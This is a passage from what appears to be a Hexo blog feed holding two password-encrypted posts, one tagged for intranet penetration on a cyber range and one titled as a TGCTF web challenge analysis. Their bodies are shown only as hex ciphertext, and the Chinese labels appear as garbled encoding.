2f7eb6bb2477ee8c92d474c6685939d35c3cb77d4887cb6c0d401ecf948a9c8d918575fc12539c682c0a12d24d96250e878d1d1525c345ea93e672f9fa95a01d1367a19be9851244ffc7aea2b8fc369a8947d45a9bc594c0da059cd76c02654c823f73bdfd541391bcb0c5e1dd9957957c2fa5bf553275287b36dcb40f84ebdfa49427ac75f198561812b30ac33f73fb59788b01d4060a1ca4b522d86dc604eafa245bc5d249cc8a20b827e7be716e7e5cdfcfac8f3a24f244931397b092b03c2658c99d2c59a94d1da6a6eb3df9a7d5ad34e8f356d6cf8beca3ed3567fee91047b9caa5d6c64d3812877c9ce42a4250f28108314c1e04d602116276cce4b9041ac9248963b5d2c206196a341acd1dd4ad85013b2a58b9d86bb8c720a77e792f9dbb671b91d570adb88ada5c9dd5bf50b66485608f9ac9c26101d7fd57398b650823168843b0d1078b12b9d7058d9f48497ae781ebe798ef663c50dec48ff74d5b2429250dca8dafdd1f8de07600e8ffa5092286b4e5a0c55b26a8f459e292832e8aa205bdb3f8e294420b6e141c661254b3f223d91f32accfb5d437a27e65baf3d3cdf7ba65ab2626d5882d00835634274a73f00436e5e3ef331befca250b3168d10a848f05bb5c097baef667b70cb3c239e5023c5d9639b26a18ab86a015d8e6e1ad16f1f8d387d2194c5da7b0aeb99a6f27365af748181dabada38d2ce164035b00ecc9d22555f7218f3e2204782a6b58c0059ce7cc34917c746a7dbf40f6ad8aa33744d50746fa33351ea4c66309c676ab012a2547bbeb549e6476f13a6ddf4ed3d2e38a8e418b53a611f0dad9dce9c3d8f8a5cb6fc8db39ea1d836c432c236d78d994be04447b722fd29a2f612fe8ccd8de4f36bf61a0f57d92776a2e47f3729fadf1afeba4e1267ab148f017a81bcfd4b87d1287c9936cbea9d5bc72124fe337f140aaa6a678d6fbaa8508603a9231adb1d88b83d2732edee176b97487daa1a81bda8f489480854a7401d65e2d316fa3fa9673198a9c174e959c28f7bc815e2b4aecdbcfbf024759ec830b86bc4ee415cb1bab9419ff67e16f043e15aab6cf8ce85b24405128abccd1eae5d2e9a50612e649269591a5ae8377aa8ea7883fca1faae0863904d89419817f453488e6b73d76850826215fb9ac7f6c5957238c1d6a0d3370c01655284e1e12b3a065c295da0490d3cbbcd483496d6c0695337955fbae79e3f78240d853ef4f1e9fe293cee632d48d275b4faad23eedc65d08fcdf2d8402776455753d12f5a404ad4e450f913990810462661f7e93438ce24d49cb707a14d08b6b302d337f8707f035d70ba874d88828530f060284815b9da3182c72f0a82385144420be3ee8777b9acd818b05dbd02b6c35e4db12501413a6c000aa5208bcfc1c7f89e905ca82ef0e37acf83c26df01e4d62d08a1bd350108ce1f72935e0ebf4c27c4272e0012c3e6f0a6e5add1347c60cd013d9c6468e7bc2f8557bf2ff5e706428754d7ff8d5567578d28494040d7af3ac6f8286c2a21d0305f0bf6eaa5354b80c18293398974bfb37918924b6d3f7374ae0b7971b1e5143d16a2631162a7abf725377b5843e5f5be1e77fe77da7b960370d4758d611f5f5b8bd42f6bd22fc0e69369cffdbe60e83221c728be8ed7452a0c1c23ab5793d46f7865097c2a96c78f58deea10a2496c8f305c43f708feccd4b447a70e81a5eef0ddad83b1185ed7dcd0dc9e56bfd2cc6b7fcae98057e92a08598178734959fb40b2e48fea3db0c8e0830e5b7e629dc7e8527a4d74c41e81bacf5c5f62d4f3ffe56a057591d422adc515d74090e2178d1bb7f3a12f80812c3857c58f2361dae56499e5a7dee24dfc4e91abeb33f9ddd3443d603e49c2f92c3a99049d88daa98e571ae1efe0e1fa2205a95e0afd77ce5509e40eb199abf28b47b8b3b4dca4c2ef2e001d057506fc8f5e58dc70d53ff13c8cf4aee20285f8eb22fa5c8d2004e0fd881a59428c0b24e9131494fb60b35aea8a3f74fbace3d716f495c7c02d0c514810a79a58fd5b29e2bea5fd19039f145cba46b288a823c49786432e148ea7eb8650ac88566cfe2693d5092ac547c738d0bc06fcb525a17af0b825fa6a8ee8c0ab2b2eea0286cb42341ac6b804def6f4bbef2f204cc865fc6109d5b45a47e2d54bc519f4c9ab08bf57deda452405a5148693463f0c29210542abc6c573bd88739a56a423260d8f1a54f9ac6b225a49cde1ebe2310bc14b2d8c0512c3c2343cd7d3d8721cf9913b399c890590fc46f81b8c3d4b3dac9593110b5cf2eb2849d6112eda95faab704524663abd9ad4d81101bdaa31e2d0709d459f2309b162b4b072d9c8aa417015dea1a8481a6a2526b367cb6d938692ef62da208a84a1c263b6bb490daa7ee209d0d8232eb3e9edb95c74903871c06cad00c7698416143c039f9ce0536576f6049f2837ce07cbfdbca4d2b4a09bbfac06e9e988450437fe4750c8c9c9154b8b66e6625e8c6669df70cab96125c0de96b1ecc04d6e14d131f775a38c27034ddc1ce34bf934f0920183cf4264df59eba527fad931ce7a9fda1dc353d840b216b6b7753c50094cb3219e22d96cbc3e0437c12df9842d31868a8a99e44961981d2d9530373e5f9b9abd28317e64f03f3410d3c4ce162a91b693f4c2768f01447b0762761479a5af46c2d41499c91e795ba104a09c358cbe68d636bb7139a15834f55ff2e0c5fc2dea4455f6fbdf9e65e4ad0280465483271c840ead39087f20ff22be38455bf391a4095dbd4adb0b395f7c3b509dc23513265a16a4312759b1a94856e76a54517985dad70f23c75a7e2e008734520cf2c8ab6cc66079abc945e5711ca7f5710d9354a9e5fdf1f13d2078281bc7de9c090a9d4431ad9b77336539db4d07a4b2fe101de08a93be76651d7acbc4a2c5b765ec61fe666c0f2af1f74335c93c634f40e3cb82c548ecc11e71eb03daf2b4e81fe8d6efc35c769eeffe2db8840c953195b29a474f845c07dd8e5f59bd6461a31985297a3ef1bacecfc8fac8d8f194f4918d0e74a7907d5f5c5dee65333f2472fbcd22e019b762105d76a31fc9a4d145c71206e92ecea6ff1176fb00f133606232a036f97c10f76c9a5cd2b9a72a990c6a97acc85992a30265e8490e21b154bd9e1312a1741fc52923b7a78a0c0f8c835783a2bf3ea71d42048f678f630a895a36619edb02ca39d4468761deb6bf7e64abaebd3f1cf7a9f1c44db78512148ee54d5c332e4b724cfb9f4040f6a0bac314d0c06fb6167fc5b17200dde21dc9500122f42c2cb842699fb08714aeb086e12bb2dd8b9cecba147591cc36a363010eededc8ba93b8dbe060fca83521de546da0dde95ba3f1b27208db1299c5415ef4d94a3d911bb974085e659d6bff27b3db62fdaf278f045d95df58619bc2add0bdf32bdfb1b44f7191599ce5fc6974c2d70dab84047813b2f693d264d0551994512f7b510cb915fc8e852cd3df8c5930e1fbaa763d1d240be73e9d1ed1bd148d617071ad7a0060141a20dce280f936bd1c5c0c5d04a3272408d8dfce0987a6ecf57bd808976152a65e267204689d80e5a90c8ca63f25251a6867f32315cf6202972916436e333d93115f7bfcea5dcb0f0c857a5d989b767fa55da9ab1f6f32ad69aaae2ed7f8ee9ee6a5aea8208d930bd0304e2aabb8ffe83acc242559b957880823ee780c0f9ea7020552f9c8b870c15f0775c0469303098dd504b753ced9dad7475497c371b910702ee19eb4eeef930edf5afd650bd5b43a572b74599bd41f11256b9672d431f88f6dfbe8d919d46a63aeae00109be82ac1098e164e4b7f9211c9423c17dc9c22335eb230f973c3103c77f810b23859d19aceb15ed2c4f93348597ddf716afb6e7fae5418566aeb9b629095afc0bfc8d454410d6754f32cbedc53f7463177833069186a87523a6b5cca48ab7ce2a22239cdce8069083b5dc2a2a575bfcfb0066d3ae616e18d0bc15040f1f0267de278351efaedbe1f6e5157431ee5c60130ba55a5980b723c683fcb327e80d0f448d662f8fd2ab1f99012e3f120eb5d04aab0b83cbe0fb585850150ecbb5d99931a4227e6543ebea6a804066596b92f97fa6722df0492c698c04186a18ef2d9eabb6ae1846ba8b0fa50b8f481eba993284a2fdbcd467496d5ba576b90099f83d8c1fb55afd6b31d9e10c49be01555a3c90aecd0d7d9210b35babbf4306ee3e42f9a1470ea84fdf31f96f9475cd0feb6eb424384e9aa5718eaed6a8ecfc63ed94ac98ba0b400155f16b0f7e96918fb5a02af03279022381e4ddc6f9540de2f583ac33925e0cc059dc9791c7054b42c614e279ddb94808ab1d3497f3c8a239b802bba76cda593132caac9f9ab669ee2ebeebba376b0978d5b18e310718b0c2be96d45bc21a12ef4a98fa86648dbe20f8d30cf7026d74c155f8e997745166aaaa7db4e7f2e5392be2f5b3eaf4e335fbce563f5a67b21d7fde74070f9b7a708951187de0eb2bb4395cb2f58f133e7de5bb20c4d3c982a081fb3454bcbdb76d71d7956301c9b0b17ec63a119e260ef6bd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>é¶åœº</tag>
      
      <tag>å†…ç½‘æ¸—é€</tag>
      
      <tag>æ˜¥ç§‹äº‘é•œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TGCTF-webæ–¹å‘å‰–æ</title>
    <link href="/2025/04/15/TGCTF-web%E6%96%B9%E5%90%91%E5%89%96%E6%9E%90/"/>
    <url>/2025/04/15/TGCTF-web%E6%96%B9%E5%90%91%E5%89%96%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fa382b56a42c6728c3f252ebc6f45085fc5399f48be6b786229a713e72278383">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d0d36ea96aad2a673b8b813abc6b7babd64581aa0081dc619054808beaead8b4d5004dc60e042e0c3c843e178cc87a411e705aea242127975f7fc611a61d45580a508bc5b7e2699136733a88d685184ee16843fc3f7ba31b524fdfc6e075188c0915f1a635d764f7b596f78a90e7c11571319f125bc6b49ad3660fc3902707f5bf736b1ab20918e59e0c3a88a3481cfcb7e98ce6752fd04e666ecac27313368ff5b3bdd931daecdabf0829368bd7d2b1d428eae64f98e55390f99e760df52e434f06023bb163c8cbb861fe15af19d148e4d903e67c11297fda819a7457e5ee3b7d64b4868cbe75536a9a9a4c0fe006cf8cb76fb1c63d8c4c3fef382cfcdb63041eec314bc658c88a652bd0e1664f4cba86a51d6429de0d0ac92252c8db0d3509807dd22257ea25897b6f6e4cdac4e48150ffd8a7e0fdfacc33269f0c2c85ffd29c71675759d9093e36fa338ca69693bdd4c6d2d183c01781bc4696ec3f86b30d1b59f0339b6599642c66ce0b0aad00fded486abb428221fb0c89587523a12c081265c74a5405bd58f8285498abd73f7836f62644cf16391dc4ad78f528ffb2d4bd2d20e7bc1aa74db0547ece7ec6f81e3722d63acb5f0ebbb09b95a58ab8906d47bf51a43b84494e7e06dab63e7d2bd31988eed14d7576be7c61df747b5dd6395a9803884ae4b8e6adaa061dd56781b00947c475d53d99149f1e6e361491e087ce599ff7daf25be23e7c8b24a779877b1b61aa0f87a5d9fb05aaab1e436314febc56b983b28a968ad3641511a8f2541d62a05b9fbab4290d2801a38763abdeff699d39d785c69247f50fd593e377d264172039ba3c5146560d4f78b06edaa131cfdf30468772cc88d3027dc8c111a178718e8aca1188f853b20b0f6a4d0c3a6dd2dcad27e9034fe00b7496d78f4afb02010cbf63c7aef6a84fa4d0d7960f34fac76490a665cfbad99c5192551c0e5e1c6d1937a2457c767db4f0b3ee6af00f8a3dce1a9ee749140a48c9a0be46746282bdffaf3b7836f0c3a904f78385620e93975dfe654bc0faec8eb89cbebe8ab710fa2e1bd025c8701f3d4c1825cc3a917ebf6cc820b519955eb5ba02d44911dcf2af6e7cecf38c7452d6dd35a9bbe497904846a86915f39048bec10f5639183684107e173199886cec91ca29776bb5ec4a8a9875f122939d385ea2508501848801f78ee7327684e18d9c90101a2e0501383d69fc85094c34992ae072263c29e2a4de4d9f71a8fb004fefa3c8e151f805439548f7a00018a78798978606786222dcd1c9be047fc7f044f22e8ecd025073b8666c02ad0e1532d63009ff29b620e891b4c78e7376cfc59a0b3facb3303aa0efe42dacc32a235726f8cbd8d2cf58b4522e83f31c4e5821835d2ae998e666baa49f6c43decd36c9b79995ceed3b8195a80324c21558d684dee8df5f082f21319dd9b0e44107b4b2854c59b86f921b971dc344ab79abd2f18740fa603fcce45c350af50455e4bda860d437402d9cee227d39292c60b1872afad11c00b949794ff2a17fbc7502ad1e2cf9ff3be7e88613aeb76d1012610001dd6607b4446326a43595fc128bdacb5739e9d3339191614f92fa45044487086338866837e6fd46fed1efd233e49ff251727a4a562768311764a40718ad574dc85b043e3eed30a9d8681379b19beb4130218445f379a158a1f175dd9aa882814fe573851ebb03b298614d1dd842e8acae968f56f125e371514af7cc1966a7a6ffecbfefcc04741885c537f68093dda18b8bfd4e1565055c74c45d57f77a32010fd0bcd2837b7ea861c506d90c3e8543b7fb74cf3f2c21baa05e425a8c9e53dbfb48505367eb61636f95e63bfd9fd65beecb6e104406c9c4eaec7f6741aec227613c934fd46de726e179d4d1869b6d637eaceb7eb00613fc77ddb75dd99e7258788e6f0c87ade955a9bc4110412a5acce5a3aa9d9d9421c20cd468d72849bc99081cf7f8e5a6d127af220581970224a403dd144128ba5eae8a37790a453887b7c5ed3d6cd72ebe87ab08c2bd317c50d3da3729af3ae0c42c379deb44b0863db6cadf104fd1f26667b880ba47db6e02285e2d7aa69e9d30e6ddae3b85cda82981751eb88ebaf8eb34dfe4b8f3a563547e64b35a69110034f7fe4c25552d2731860f9ae7c6680d82f107c02b329325c56966ee300cf368be4b6fcbe37183971665ddb79702f0d535d1c35a8d8dcaabd65c3beebd0f3e766bd16e0fe9d996c0536246c87cfcffdb4d735d091895de1efceac5f8a56061b0c9620b24825aa4c2cf707a91f4f26dd3ded1a91b2398d8cc25d0ca3d0b194bbc9017ba5958dff336cbf11ea4bb8b1412335ab98d3f975c3bd9b5180168eb436820f525fa90bc97ac62c19a50588b66aa8752993668f4008f14730b461b93b23dff363f759209f51625c5455da7ca8ca427509e3d2ff7da020072d3add34bb808c377dfeb8e4fb264d065c686fcad63771a551627d8366287e3f4b8bda8943e77d35a5d3c9464fed08fce03ed7df06688b5e8d4ed277594ac4f5a6fbfa6cc60b9e013a506fe60eb5ecc59f3f2c320bd8b0eb0334bc1b4a9ac4a40c79f1e13c2870ef17a96b87e64fb973cad6a45f37f01b45da56f88adf767df4b15a5554385a5c51c8befaf63e3b8ad7d8c49bd0dbb0971b75b7bbc870fbd775e590bdb473849c31b31a9a858e41e1a7cbe5e490ebaa4f0be1473d365cda04f135fa2ec1cf21168123e25216a9065fb42454520a9395a678d6bad175df0ef482496afd466c68ad512786228d5330d41ce117e542cbe4685bfca7d03cda2eda8b38a630b917cccc4d1624fd0352f1e4966e22b8149935e89b0ac9c0b1bd80a5603f55d75f202a6de2c000bec0b3aa83b7978a2aef35574ece74ba0d9b4573bbcb0cdc750baacd238574fbe6bdf5e664b31a2e05c46f504db58d3383b209c5806da4d5219bd2e98072c213943346efb71006df8ff162c6450c48d6a611e904c166e08f5b8eb45636057e588b8f99a7e8d7512cc10c5e1a92e37cfb98ee142c6ef72f3eb904a199789e54d71796edf2e2d3a4ceb33d9c9df053f95732df23d818eb4fc42c7bff143953682041d368d6ba2b5d55d85bec1bd2736adbac57dba4f3b14d7e97713d73280a92a8b47f13d87f5459eb8418ac29c6e6191abe305fec176e5b698d384050e0d1d1a7cbcacf56e78f60b50274bd3faac291f3ba50fa8d434623cb352702c416dac9839946d3d1718a38b4edf608a3a75055b867c0befc9eb2d892edf9d8013502a21120daa9cdf0a7d59e9c0b0920f2c7b49a49ad6d6d98be08d57658e9b7a4a2becec70d02ffe97d70316dfb01cfef35fe6d859494162e9f4319eb333627113d0830df5d2058c30d8555827e2b2800fd220cf989ab88807b2693b884cdc1aae023a370fd6c856ec9bbe7673dfbd0a97f7bac6c5578d5c7cf17fdf6afe379ec6a480fa00da929f8b3e81d1cbd2e3ee567b4bdb2b950227053411f381250adb70d0d59e35578f02c748499d1f32966faf230c7208c802a7119d59ee20bd575a7ff0cf5f6210bff43776903ce339205649daad3227fa083840614f70452665a6a038bab670cd44a9e91c4fc5c4afd37b291279e690c344602e40468d9fd5d99d3ca037301f2a8badaa0aea933938099d930d4ca374156ea1b31646ade3d520e7d4fa968262e16d623ff21000826582997870fb59efe65beae80a58609e3769e7bfbd8eca7962699485ce38cf93c9aa8c33cb029912e04d0b6af92ebed6d0c0af2ebcbd295ba26a0d584c628941de0e31052b832d6a5ece49e39cbb8694e8dbb7c7c4ed28497c16e2ffa15ec6ba061b4d1fa5e73ea896eefcef9fb790ad0206ecca28417e9a3534c290a83f1996feee707d184eda0c0fdd8680664b6dae922b0c6f18acb893308bffefc1189c2b672bb392020afc438f5675e6af86741dc794dccc151d2471b571c3abeae4dd19a1caf6c782b3e3b94608040dc2edae04985388c3debbe5c68145884f78dd13af873701f1de09d911667ac16d1ad7a615aab30d257726158ae3786ccaa9848bf1ed4c276a7d53c32e1fe0b94ff6798410dab88de4507164825cbbe64a5511285b7063eccd922245f6c2df4dfa2b0021cce039a6b551f29182f4c794cbe0c96e541b0f23c29381155558a9da8680a143afa4f1d4518d208e6b5cd366771c5f227819e5ba243deb5895bd6fb37ceee9a8847d7f2050db0c1c901c093ed306ba0c86cdfb56811de7e60940d35c574842cf29e5ad8bf25bd83e061d5f349b75f9f5e4ffe801bc5e60858e04e6bdd8e0ac89286f67ef8216c6574651a4a828a3b626a8e1895f4f2eee506f696b60c17fceefb69748e9838c946bea3d5844176bb1a652c5d4ea382d39a8f180b0c44268ed5aa5ceabe2530532f78148e87c226b3643e7ac190fc7275c1e78cda377c43f0ecd37b1f4d34f082faeacb6ef7870e179fbffea72c930f9eaeba78ac882358ae53a8f8daf73e1553e0b1d2536a262fc48caf66252a36933ea1410608c15de0d4c89e9ad22e867a95ffb7c87fc820f1cba687882a4dd941245a9a1a949839c2911a2a481b78f91efae0bdcef2e35f779b77bf815bbc2f692d209a99b15890070d5424c5f6bdd89e950af72906a533b4dc52960e4ae579641ff809fad09bbbfc5275e79962fb898f9f888a41115a27156612af98aec20c34c23fc2a8a0bb667102313afd9c61984c46451612f47e502f996c1ca1d83290772a2dc05f83476454446f9466156558d9fc2b6df02a7cb730438c2601df7772460e0a23d8ac5d79f396022ab3356599a5b5528c4ef47cc1e36d9d4899f161c742236c48f75b22b32eba66d76b98dd92eb97c352aae44d7b3a2dee57cbf1139da7fbd6143905bc4408529a9346c8b65bfffcc99cf0272dc830f5c0f4df9600a728847829a4bae60248b78c712d97918475057b9846c47df3baf69c621197ad45cfa6eedb24f4830bd04bc498e4fa6c820fd02e0645fa4bb1b12ec172ea26969103d39d186f2988ca2e1ddd5d085d76b59d7c1d9c3614be00111c5112c4f90bd053ebe75f7fd1d498f42b402d3f96bd1962cb9bad14b38e708b86bc25e01e2a05fc2a94a9e973dd0398338259477ba7df66f22a5a9ae74e22316b43b14bccebdcd0f29177d9b85045f74300fdf9c9b5a9e2ceb9609ffdcc244be22fdb85a608c148eb1a1741e44ec1f025d7dd48b841ba94ded61a7c2034dbf27e2d78abb997208cdad6bfcf72ae3991619790823a089c973e354cc4f7e4bf9bebf2eab59e61e1bd6048de211432e0c8128f7c0d66106964ea898c5d0a7872865d52852cece49cb4e8c7adbad8fc6a5a3cc1f0fe5ed64ef1cb211decbd128fa7d785a73eb8a60d3bb5b84cd8bd249b3e2c1b5b190c12d67cd91766cc6bf0ef8a3be4afc4e02f848a1a5062c39151c88b87befbb949621f8e575683ee48da542e446561ec64f66b569aa8696b1ca210a13c5411944272266aac3bc7251364d8deb3e6ec9cc325c57be41ec3862604b863f72a7534a005d2f475cd0467dab70f472866c2928a2a372acb9af7c6af6d3e1a57d50ee9a27b631128541ac5aa1d2d11162068a221b31f66a94f928ad6768656cfec95c8843ca45456e3932eb3db751f5518cc822d6103d2f8e660be46764631bc6975331e04d1e782c4bde877ab28d167bdb25d9f7c0a649c800eb1aa2eb25848499fe06be4ede9dc6c23d2490223842c560e35dabcc0035d5624cd1d382764206bad8cac6ccf190b1d4bfbf6c4bc8cc6a3ff88895e2459f6a4bcdcc4bbee3b7667fa0b4a7b3a3bc9bdff8c0c3c14ac7dd351174553306ccaa8e702166602b1df22b6219bf86a136b5f0911a6cd06d856203530e0bb3032e2f12bb9cd9e4aad90b43293beb94ad48d153057a87e9107a875c542484ada269a27c4689a5d703279f75e21f46e2f2e675d5590ad51673e187b4dea537ac8916b1e642a3298a6802bf183f289e8244fd9879c71f665847a09a16791cf33cc33d39b7712c579c0f17c181708ce6276810b5ba44681d8a8e79f88e862bbd940c8ad13b1dd0ba4b659d716203e83a0b2b78a5c1cd256b4fd82ccb221793c0f952f3f04598f8bdef118e67b385c680c18d62586c1320194aefa1e2a1df1ffacd3733cd130d5457a9c4ac02f6230d2f49b109ec219ec4ad598efd1c949950ae1aee7bf204fdc67b4ec03be2b688685d8958c0233a51eca2ea77bfa92d946578ce7f79eba93feaa86321d4522cc005680f48839bbda2e3d5ed63613d5afc1015eb4bf2d219ac97408e84db59e9382e0197ec7e5ee182fc3e9e5c533f77d7b3f5c62a975d3d5778e057997d7ebc37d511f0d843c268fdd485f33dcef78caf6aafe4350e57b9ff7e7c78ed6753644748bd5cec03dfc3aa7c559cfb9e9a032368eef400bced0f924356775c42587aaba07846b004b726cf9351f1a0e1bba7cd4235dccebea08eeeaeee222368bd046ede830d7f009d245be34b1a00e0630e96d3ee9ba609c18db71659e76150565f42a7080afc5b18dba0e6084b6cd381ac8a77012221fc9f2e9ec1bec045a4d4496393bac46d50b4d29ee218b2800109c0f364b7edf3464ac701af12c28811f3314fd28c223de86bc25ab0f9522665cc0a047822c0ce295b7ff5a991ca3f1fb52d2efaa8482bc4d61249c1dd403d2438e357223c15364c3070c032d01b4355dad1b1aa5e325699570ca3f669ccddcf977e6b7e3cb6ea627cfea0675d6867342240bbb59f06872e14871dd0c3fe8d54eacb8e93560a10503d92c7c27307992353943536fe71fa35fc8edad08b02aa735dcab8e080b688a0024b946cd372d8910c26c1342ea0d6721e3cd2d96d89d5caa86c160a619fb6fdf56b78168a2863ba977debee3f73b618cc90c3461b17174a35781c4d5e41a65b6716b437599673dc95ccc002992a1d4d547dd3a4c058bd719b222161630b38085e2d8ca370ba860cbca7bb0c704e0e8d412c7b2914be8aef679d415cd11ac119f9e2504e8f48449e2782aba46fe05b007e966c0eecdde8f409524223c8fb1c47338e574468b0c25bda556124a9df09db909d71088871842abcae0a54d215afef1c99b0438a253732c7b6c2e6fb6a126beea332a2dd30a22d1bbc67ee34a93a3f6291dfa4107fdbe426dfeca8277342255e20a391a823be0e0d68ffbf681b44fdab92084cd13f9143b44cf3fd7ba2567c16d6328d7c8ce7de6ae87c8b279183f60b1f3ed3832f6b1bd5022758bfe883d77aeb854abf0efdc882c8d7ddbc1c056d8a83f421a1da565f6bfda79b2978d9cdf7d4269b23c0932cb2ddeffaedd008bf3b12ffc523e91568d73802477b41634f5a3b9cf79d121e861fd886ffdc3f1a55546d8df7936ae8e2fe8bb11b1c6c7905c7f74a08cce46eb1881103b1264e7b047dbbae979dc18002e8ce123da146cb401583d84c35653afb8a7311abfca77612cf039b38144db2d34b6fccfbfa7481e5ac9aa6e1c66a70319f82c4cbf604d27e9913b97f9ce69a1eb66ea6fc4fb38618c75f2ec706b2af013e3714707e6b43db31267d925e6fc40e4fa7b46666cd845ce01c0292297e148deca52396b3f091d456938b3e1f9666871ea21c11b09dce581e3da1c186f81041a59f040651028ded67cd99f5ee59eb20d691dc79ca2b600da2d700d7c8bce685270e64a2d370d071b936af5965423d691e22eea84c2a21e9b883174a2bb896044a79f53155217d8b57eb0983b8e390119e6dd83a195b4861e1552294d94cf8cb75e0383749092ec24e9edb0fa5ab0e78f1f2828d5eefc71e0efbf8bc7984709e31290a3a3d4bf3d04a0d7e3734adcafde7613f9595c4bac44b5ac3cf7d11e8fc3a697c290681148d5980c6b4fa3cc8be210593fbc8f1ede5b7180c7f5b7134c26377129305a7558fd76e1de15feca6fd6ca59f355bd10f69cc0af863d2c46b49f808905b91f907ad524485f45038ab0c2ce58c89966946ef4666fa031a0a1966538eb2efbc0d7a8efbd02ca27348dd6595c1a3a4a3d901d08c15bdc9b69959d31041f458cadb16499ab0961ec0a4c37852c6dc7d2077da15fb1bf564f3eb481f88d53e4d9f4144ba03d8ea3d223c25952af5c691997ee238e21d5079b4949f358d79750c6d401bf62a7a3f441e0ec60b629f5de267744422be3d034ca01e5fde2119f1a5e23dfbae836eef562247dbb62553ad6588160524a0658bbc7fb8d56aee4d96fc52a84997dce507d4bc5327e6ee5e3611e0d27d893910d85553909830fa0ed4b798d0afb81373953e78c25669cf0da13ce7cb793aaa84666481b2e4ae907e737c7e9e7eced166463d8e83e31dd9c9376caeb7f5ecc242ffc20b661e98e601dad2d60ce757fbab5885e18a82095450656511a31fccbb16aff9b612efda8b54d37bb3ce307f3f8e0537e147ca7a03e2df44ea166518263cefe84ed74f5099d5d519e660f4414d5b9a9b293cba609dd002bf148ae6b18c061bb54ca057cbb2076b601befa98399d2b24181720c23ef69446d438588dc66498e9e85dceca1f952726095797d83b3ca3998104527e88bea0a0dee4d7553eb2b5c8756ab1b1a0b7f1524d5c3697ebf1e218ff5dd5d7c90a96dd114a893bd71f090ad151176f1a55fc38fe2dcd8d94b6c30a919e31c99bc400e052b954d95401ff46577507ebd0b3188eaf8463df86ebc0732ba56883e06c03294551002afecd669da0b0513fcdc0873e4933e7c14c575a3003470966bad9660af7f83e32bcd27dbdb620b9ea64abf08f425dcefb817ebab450ea489910180d96ee55409a46e22febb50ea49128ade7e631cea2d5f1da5f1da6d3cd2380bc8a00f7ecc753cc17eecd17415ae1a1551987c7b76d1b0e4301761b16efbdca6fbfe8a78f9d2a2a557eec4e85c655e185ad86df28a2411c779633f8a9d30409d7713ab71eab550b7e27fef0f977dc84eaa0e66a768e1519b92b07cb801dc92c7b52303a01255a05070d8f56778c8d5ecbd091ab71b97da8fa82d40bb1bb016379a2814c3d1f9b92a3c5b50bb1cf36d43b9f9875eaf159e69600e4df5b519ba6a3e4fc651372325ee24d04ccec15e016364008801b3524b925d5b1a3aaf311dba0234793d87177c2e229745e8f1d470d83fdf6b35a28cad4be11c0f72a60cd46d0cd03c8986e823fd1dd1f4485a23851a92dde573f0910252c987f147179b1f25374aa621241adbfdd1fa9192c2f840435b2021696eff43ecb2ad2bf195068118f8e4ddea3739ae6dac46389bb9120cf42bdddab65474596191388d0360f740bae0f635109c0ef1fca847a01d9af698da3b628b269bb472736266d4a575bfd2d80f7cd8ceb6d7b9d9d3135de28233e83826ecd3a7e3bc14b570201bd7cfe4a14fbf8071e0028de5ddb413951db1dd518138e4220c034b7b0ec77f4946dc92585bcf8fc7dd9e90ea563e5f4f7f3ead0683bfdac1e2d6cde2b6c913c56bd67a9edfbcfed055a377aa5495da0815b2047175e52ea72e2ca26485c7200d5efea240a2b119a4c64cc3d25f1c9fbd73d86c2c5ee4dbad3999654c075165128fbac1bf59ee50e96326a17221200ffee598dd563441e25100da72f5603ea2e3a153f676f2b2b04c8fa5a8ffa69e4d9be6dcb9513227659c7dc501ae462aa5246235f22224ef7dac15933870634f96280ae97f54eb3c2594a60daf7094dea3e7be72d02a2261cf2f6a27c5a5db28876328ebf91f7af0e774477a16197b921419d498e8dd13b948c8112916570474955d00b3ea1ac3ad11086b5b3430603825e8affdbc9d1fab9a457a016844261213e043bb3fff8fec64c41b5d543c70a2d03d6da384cf0479a5efcb3c2055c59832f89e2f282aed4e41df7981d38ed75bea0006a1002a5803a5875a03ac12ad1809af0042733a1f8d58f1aed3e5f85273f5445dcc2a0d89c07c81b13e56c8010bc83f8473fc5129ac2d23c333db4c6e98b98c1bf5332905af1d9a4887dd540f1cd4a8aa60e4239383345bdd6d33870498f3b934fb851224535fb056b8576031dc698c4ac617e73c704a3fd9b7e4d86eb9f9fcec4a0a3c367d6bf15dfd380316f2e9f8d8a2c0b67f2cfa80516abeb1b2c9e1f44958e490db97e7ce855d36ec141f65e5e5eb9218f1deb1e94725d3d40ca72f4f4426b16eb05b4ab51b7f3c57b0c12b17600948b35f92db715758502c4f7ceebfca90ebcaa6564241a48d5b374132c404edf48752265e2ac25e9383f4e01e256ea3b31a322fa53794fe148ca3c9ca699818dae88dffd1f9daf7bde7fc2be8b00eb2cc93fb0f1dbd2f1332e168a0e560711631106c8c454ce34e584177c36322b373876ffab6709f3d485e98ecf9e127f3e8f46013eda9ae72a0c39f6470f1ab7f72bb709ce03004db50dd0897b0f6f6dbdc8b55aef97c2f4f1f048707400022919f57d74f3b67292c7b7cf547050b91234793c16fc7940e0bbde8b9ebb7135bf340af3e6cbdebaf8c3e7ee09392eaa651bb33c59e31115c246cead7e651ed33f042cf1222049ce9d9873cf229e07a42ccd93af2c959dfa0cc69f6edef26fe24f60dd63a77abb25187ffdf917937b96543ca85d3bc6e2d5838e4433e27e54c7e6c0f9ec07d6efb6d5383d8df4f7e17eae0bbdec25c13e90d53b27b9564446ffcf14829fe9ac9ff8b4ba82bbb81c7035b24f7d4d39d6c628621df084c6ba729ff42bf60cea3b715adfd06dbf5020ca093aefd975866f799c25c11b163ca13ef8397ce0477d2f6bec2c43c061564010617757b2cd1ecc78336469d4fe99be033d724f9a8edf5ae3eb5851f99041b5f78116651b013ccbfc8ecdd86e6fb62eaacd594be837c9fcf7206ce44370721b7ac4c82350d270cbbe1c60f